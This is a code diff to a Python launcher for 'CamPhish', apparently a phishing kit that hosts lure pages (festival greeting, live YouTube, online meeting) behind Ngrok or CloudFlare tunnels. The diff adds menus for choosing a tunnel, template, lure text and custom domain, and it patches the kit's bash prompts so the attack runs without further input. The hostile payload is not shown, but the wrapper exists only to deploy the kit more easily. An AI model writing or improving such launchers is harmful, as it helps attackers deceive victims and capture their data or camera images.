@@ -405,32 +405,81 @@ def ensure_bash():
 
 # ── Instructions ─────────────────────────────────────────────────────────────
 
-def print_instructions():
-    line = "━" * 62
+def print_banner():
+    line = "-" * 62
     print()
     print(line)
-    print("  CAMPHISH — QUICK START GUIDE")
+    print("  CAMPHISH -- SETUP")
     print(line)
     print()
-    print("  STEP 1 — Choose a tunnel server when asked:")
-    print("    [01] Ngrok        → requires a free account at ngrok.com")
-    print("    [02] CloudFlare   → no account needed  ✅ (recommended)")
+
+def collect_user_choices():
+    """Collect all menu choices in Python before launching bash."""
+    line = "-" * 62
+    choices = {}
+
+    # --- Tunnel section ---
     print()
-    print("  STEP 2 — Enter YouTube video watch ID:")
-    print("    The ID is the part after '?v=' in the YouTube URL.")
-    print("    Example URL : youtube.com/watch?v=dQw4w9WgXcQ")
-    print("    Enter this  : dQw4w9WgXcQ")
+    print("  --- Tunnel Server ---")
+    print("  [1] Ngrok        (requires free ngrok.com account)")
+    print("  [2] CloudFlare   (no account needed - recommended)")
+    while True:
+        v = input("\n[+] Choose tunnel [1/2, default 2]: ").strip() or "2"
+        if v in ("1", "2"):
+            choices["CP_TUNNEL"] = v
+            break
+        print("    Invalid — enter 1 or 2.")
+
+    # --- Template section ---
     print()
-    print("  HOW TO PASTE in this terminal:")
-    print("    • Right-click  → pastes automatically  ✅ (easiest)")
-    print("    • Shift+Insert → works in all Windows consoles")
-    print("    • Ctrl+Shift+V → works in Windows Terminal app")
-    print()
-    print("  TO STOP / EXIT at any time:")
-    print("    Press Ctrl + C  in this window")
+    print("  --- Template ---")
+    print("  [1] Festival Wishing")
+    print("  [2] Live YouTube TV")
+    print("  [3] Online Meeting")
+    while True:
+        v = input("\n[+] Choose template [1/2/3, default 1]: ").strip() or "1"
+        if v in ("1", "2", "3"):
+            choices["CP_TEMPLATE"] = v
+            break
+        print("    Invalid — enter 1, 2 or 3.")
+
+    if choices["CP_TEMPLATE"] == "1":
+        fest = input("[+] Enter festival name (e.g. Eid, Diwali, Christmas): ").strip()
+        choices["CP_FEST_NAME"] = fest.replace(" ", "") or "Festival"
+
+    if choices["CP_TEMPLATE"] == "2":
+        yt = input("[+] Enter YouTube video watch ID (part after ?v=): ").strip()
+        choices["CP_YT_ID"] = yt or "dQw4w9WgXcQ"
+
+    # --- Ngrok auth token ---
+    if choices["CP_TUNNEL"] == "1":
+        print()
+        print("  Get your free authtoken at: https://dashboard.ngrok.com/authtokens")
+        choices["CP_NGROK_TOKEN"] = input("[+] Enter ngrok authtoken: ").strip()
+
+    # --- CloudFlare domain option ---
+    if choices["CP_TUNNEL"] == "2":
+        print()
+        print("  --- CloudFlare Domain ---")
+        print("  [1] Random URL    (no setup, e.g. abc123.trycloudflare.com)")
+        print("  [2] Custom Domain (FREE -- your own domain via Cloudflare)")
+        while True:
+            v = input("\n[+] Choose domain option [1/2, default 1]: ").strip() or "1"
+            if v in ("1", "2"):
+                choices["CP_CF_DOMAIN_OPT"] = v
+                break
+            print("    Invalid — enter 1 or 2.")
+
+        if choices["CP_CF_DOMAIN_OPT"] == "2":
+            dom = input("[+] Enter your custom domain (e.g. cam.yourdomain.com): ").strip()
+            choices["CP_CUSTOM_DOMAIN"] = dom
+
     print()
     print(line)
+    print("  All set! Launching CamPhish...")
+    print(line)
     print()
+    return choices
 
 # ── Main ──────────────────────────────────────────────────────────────────────
 
@@ -440,8 +489,9 @@ def main():
     else:
         base_dir = os.path.dirname(os.path.abspath(__file__))
 
-    # Show quick-start guide
-    print_instructions()
+    # Show banner and collect all choices from user in Python
+    print_banner()
+    choices = collect_user_choices()
 
     # --- Find camphish.sh ---
     script_path = find_script(base_dir)
@@ -476,7 +526,7 @@ def main():
         except Exception:
             pass
 
-    # --- Patch camphish.sh for Windows compatibility ---
+    # --- Patch camphish.sh for Windows + auto-answer compatibility ---
     patched_path = os.path.join(script_dir, "_camphish_patched.sh")
     try:
         with open(script_path, "r", errors="replace") as f:
@@ -490,25 +540,57 @@ def main():
         # Fix 2: Give cloudflared 20 seconds instead of 10 to establish tunnel
         content = content.replace("sleep 10\nlink=$(grep", "sleep 20\nlink=$(grep")
 
+        # Fix 3: Replace all bash read prompts with env-var reads so no
+        #         interactive input is needed inside the bash session.
+        replacements = [
+            # Tunnel choice
+            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a Port Forwarding option: [Default is 1] \\e[0m' option_server",
+             "option_server=\"${CP_TUNNEL:-2}\""),
+            # Template choice
+            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose a template: [Default is 1] \\e[0m' option_tem",
+             "option_tem=\"${CP_TEMPLATE:-1}\""),
+            # Festival name
+            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter festival name: \\e[0m' fest_name",
+             "fest_name=\"${CP_FEST_NAME:-Festival}\""),
+            # YouTube ID
+            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter YouTube video watch ID: \\e[0m' yt_video_ID",
+             "yt_video_ID=\"${CP_YT_ID:-dQw4w9WgXcQ}\""),
+            # CloudFlare domain option
+            ("read -p $'\\n\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Choose domain option: [Default is 1] \\e[0m' cf_domain_option",
+             "cf_domain_option=\"${CP_CF_DOMAIN_OPT:-1}\""),
+            # Custom domain
+            ("read -p $'\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter your custom domain (e.g. cam.yourdomain.com): \\e[0m' cf_custom_domain",
+             "cf_custom_domain=\"${CP_CUSTOM_DOMAIN:-}\""),
+            # Ngrok authtoken (Windows path)
+            ("read -p $'\\e[1;92m[\\e[0m\\e[1;77m+\\e[0m\\e[1;92m] Enter your valid ngrok authtoken: \\e[0m' ngrok_auth",
+             "ngrok_auth=\"${CP_NGROK_TOKEN:-}\""),
+        ]
+        for old, new in replacements:
+            if old in content:
+                content = content.replace(old, new)
+
         with open(patched_path, "w", newline="\n") as f:
             f.write(content)
 
         run_script = patched_path
-        print("[+] Script patched for Windows compatibility.")
+        print("[+] Script patched for Windows + auto-answer.")
     except Exception as e:
         print(f"[!] Could not patch script ({e}), using original.")
         run_script = script_path
 
+    # --- Build env with user choices injected ---
+    env = os.environ.copy()
+    for key, val in choices.items():
+        env[key] = str(val)
+
     # --- Run ---
-    # Build a bash-format PATH so wget/unzip/php are visible inside bash
     bash_extra_dirs = [base_dir, script_dir]
     bash_path_prefix = ":".join(to_bash_path(d) for d in bash_extra_dirs if os.path.isdir(d))
     bash_script = to_bash_path(run_script)
 
     try:
-        # Use bash -c to inject PATH in Unix format before running the script
         bash_inline = f'export PATH="{bash_path_prefix}:$PATH"; bash "{bash_script}"'
-        subprocess.run([bash_cmd, "-c", bash_inline], cwd=script_dir, env=os.environ.copy())
+        subprocess.run([bash_cmd, "-c", bash_inline], cwd=script_dir, env=env)
         input("\nScript finished. Press Enter to exit...")
     except FileNotFoundError as e:
         print(f"\n[-] Could not launch bash: {e}")
